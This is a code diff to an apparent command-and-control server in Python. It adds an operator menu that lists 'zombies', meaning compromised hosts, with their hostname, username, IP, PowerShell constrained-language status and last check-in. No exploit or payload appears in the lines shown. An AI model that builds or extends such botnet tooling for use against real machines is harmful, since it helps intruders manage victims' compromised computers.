@@ -2,21 +2,38 @@ import time
 import socket
 import listener
 import bcrypt
+from prettytable import PrettyTable
 
+
+
+def list_zombies(socket):
+
+	x = PrettyTable()
+	x.field_names = ["uuid", "hostname", "username", "IP", "is_constrained_language_on", "last_check_in"]
+
+	for z in listener.zombies:
+		x.add_row([z.uuid, z.hostname, z.username, z.ip, z.clm, z.last_check_in])
+
+	socket.send(x.get_string().encode())
+
+
+
+def close_socket(socket):
+	socket.close()
 
 
 
 
 def print_menu(socket):
 	menu = """ 
+
 0) List zombies
 1) Exit
 
-Please enter choice: 
-		"""
+Please enter choice: """
+
 	socket.send(menu.encode())
 	choice = int(socket.recv(2048).decode('utf-8'))
-	print(choice)
 	return choice
 
 def start():
@@ -41,10 +58,9 @@ def start():
 		while clientsocket.fileno() != -1:
 			choice = print_menu(clientsocket)
 			if choice == 0:
-			# List zombies
-                        	for z in listener.zombies:
-                                	clientsocket.send(z.uuid.encode())				
-			if choice == 1:
+				list_zombies(clientsocket)
+			elif choice == 1:
 				# Exit
-				clientsocket.close()
-				
+				close_socket(clientsocket)
+			else:
+				close_socket(clientsocket)
